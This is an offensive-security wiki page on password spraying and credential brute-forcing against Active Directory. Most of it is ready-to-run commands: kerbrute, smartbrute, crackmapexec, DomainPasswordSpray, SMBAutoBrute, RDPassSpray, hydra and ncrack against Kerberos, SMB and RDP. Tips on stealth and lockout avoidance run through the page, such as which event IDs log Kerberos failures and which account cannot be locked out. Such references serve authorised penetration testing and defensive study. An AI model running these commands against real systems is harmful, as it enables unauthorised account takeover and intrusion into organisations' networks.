---
description: >-
  Password spraying refers to the attack method that takes a large number of
  usernames and loops them with a single password.
---

# Password spraying

{% hint style="info" %}
The builtin Administrator account \(RID:500\) cannot be locked out of the system no matter how many failed logon attempts it accumulates.
{% endhint %}

## **Kerberos pre-auth bruteforcing**

The Kerberos authentication protocol works with tickets in order to grant access. A ST \(Service Ticket\) can be obtained by presenting a TGT \(Ticket Granting Ticket\). That prior TGT can only be obtained by validating a first step named "pre-authentication".

The pre-authentication requires the requesting user to supply its secret key \(DES, RC4, AES128 or AES256\) derived from his password. An attacker knowing that secret key doesn't need knowledge of the actual password to obtain tickets. This is called [pass-the-key](https://www.thehacker.recipes/ad-ds/movement/kerberos/pass-the-key).

Sometimes, the pre-authentication is disabled on some accounts. The attacker can then obtain information encrypted with the account's key. While the obtained TGT cannot be used since it's encrypted with a key the attacker has no knowledge of, the encrypted information can be used to bruteforce the account's password. This is called [ASREProast](https://www.thehacker.recipes/ad-ds/movement/kerberos/asreproast).

Last but not least, the pre-authentication step can be bruteforced. This type of [credential bruteforcing](https://www.thehacker.recipes/ad-ds/movement/credentials/bruteforcing) is way faster and stealthier than other bruteforcing methods relying on NTLM. Pre-authentication bruteforcing can even be faster by using UDP as the transport protocol, hence requiring less frames to be sent.

{% hint style="info" %}
Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event \(4625\)**, but rather with specific logs to **Kerberos pre-authentication failure \(4771\)**.
{% endhint %}

{% embed url="https://github.com/ropnop/kerbrute" %}

\*\*\*\*

### Username bruteforce

```text
 ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
```

### Password bruteforce

```text
./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
```

### Password spray

```text
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
```

[smartbrute](https://github.com/ShutdownRepo/smartbrute) \(Python\) can be used to bruteforce credentials through the Kerberos pre-authentication. The smartbrute utility can be used in a `brute` mode \(standard bruteforcing features\) or in a `smart` mode \(requires prior knowledge of a low-priv user credentials, but operates LDAP enumeration and avoid locking out accounts, fetches the users list and so on\).

```text
# brute mode, users and passwords lists supplied
smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
​
# smart mode, valid credentials supplied for enumeration
smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos
```



### **​​Spray a pre-generated passwords list**

Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.

```text
crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
```

Using `DomainPasswordSpray` to spray a password against all users of a domain.

```text
# https://github.com/dafthack/DomainPasswordSpray
Invoke-DomainPasswordSpray -Password Summer2021!
# /!\ be careful with the account lockout !
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

Using `SMBAutoBrute`.

```text
Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
```

\*\*\*\*

### **Spray passwords against the RDP service**

Using RDPassSpray to target RDP services.

```text
git clone https://github.com/xFreed0m/RDPassSpray
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
```

Using hydra and ncrack to target RDP services.

```text
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
```

\*\*\*\*

### **BadPwdCount attribute**

{% hint style="info" %}
The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.
{% endhint %}

```text
$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```

\*\*\*\*

